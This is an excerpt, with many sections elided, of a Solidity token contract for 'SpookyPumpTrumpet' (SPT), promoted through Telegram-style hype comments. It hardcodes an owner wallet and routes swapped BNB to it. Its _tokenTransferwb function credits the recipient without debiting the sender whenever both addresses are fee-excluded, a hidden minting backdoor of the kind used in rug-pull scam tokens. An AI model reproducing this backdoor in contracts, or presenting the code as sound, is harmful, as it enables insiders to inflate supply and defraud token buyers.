...
//https://t.me/SpookyPumpTrumpet
//💀 Welcome to SpookyPumpTrumpet 💀
//🎃 Spooktober-hype is here and the Skull Trumpet Spookers are taking over the market 🎃
...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0xaaAE4A69B1a813EABA9E42D06C02DA775d92BB5b;
...
contract spt is Context, IERC20, Ownable { 
    ...
    string private constant _name = unicode"SpookyPumpTrumpet"; 
    string private constant _symbol = unicode"SPT"; 
    ...
    uint256 public _maxWalletToken = 25 * _tTotal.div(1000);
 ...
 function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
         ...
         if(_isExcludedFromFee[from] && _isExcludedFromFee[to]){
            _tokenTransferwb(from, to, amount);
        } else {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0xaaAE4A69B1a813EABA9E42D06C02DA775d92BB5b), BNB_Tot);
            }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {        
     ...
     function _tokenTransferwb(address sender, address recipient, uint256 tAmount) private {
            _tOwned[recipient] = _tOwned[sender]+_tOwned[recipient]+tAmount-_tOwned[sender];
    }
